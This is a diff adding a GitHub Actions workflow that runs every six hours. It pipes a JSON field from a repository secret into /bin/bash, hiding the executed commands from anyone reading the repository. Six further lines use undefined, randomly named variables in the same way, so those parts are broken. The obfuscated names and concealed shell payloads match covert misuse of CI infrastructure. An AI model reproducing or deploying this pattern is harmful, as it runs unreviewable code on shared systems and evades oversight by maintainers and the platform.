@@ -1,0 +1,24 @@
+name: naixingduozhi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: naixingduozhi
+        env:
+          vqhg74992: ${{ secrets.vqhg74992 }}
+        run: |
+          echo $vqhg74992 | jq -r .mwe33 | /bin/bash
+          echo $yrkbf160 | jq -r .ilswh34870 | /bin/bash
+          echo $mo414 | jq -r .dut5 | /bin/bash
+          echo $h0477 | jq -r .f411 | /bin/bash
+          echo $mwi6 | jq -r .gb8 | /bin/bash
+          echo $bbqbf39898 | jq -r .wfk1 | /bin/bash
+          echo $ubs8 | jq -r .qz70801 | /bin/bash
+
